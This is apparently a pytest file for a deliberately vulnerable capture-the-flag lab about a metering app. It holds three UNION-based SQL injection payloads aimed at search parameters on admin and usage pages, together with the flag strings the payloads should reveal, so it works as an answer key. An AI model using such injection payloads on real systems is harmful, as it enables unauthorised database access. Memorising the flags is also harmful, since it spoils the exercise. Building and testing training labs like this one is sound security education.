SQLI_TEACH = "FLAG{IRON_SENTINEL}"     # /admin/meters UNION
SQLI_EXERCISE = "FLAG{OBSIDIAN_RAVEN}"  # /admin/alarms UNION
SQLI_BONUS = "FLAG{COLD_TRAIL}"        # /usage UNION


def test_sqli_teach_admin_meters(ops1_admin, base_url):
    payload = "zzz' UNION SELECT id,meter_code,user_id,nickname,status,balance,created_at,0,0 FROM meters--"
    resp = ops1_admin.get(f"{base_url}/admin/meters", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    assert SQLI_TEACH in resp.text


def test_sqli_exercise_admin_alarms(ops1_admin, base_url):
    payload = "zzz' UNION SELECT id,meter_id,type,message,created_at,0 FROM alarms--"
    resp = ops1_admin.get(f"{base_url}/admin/alarms", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    assert SQLI_EXERCISE in resp.text


def test_sqli_bonus_usage(alice, base_url):
    payload = "zzz' UNION SELECT reading_kwh, source, recorded_at FROM readings--"
    resp = alice.get(f"{base_url}/usage", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    assert SQLI_BONUS in resp.text
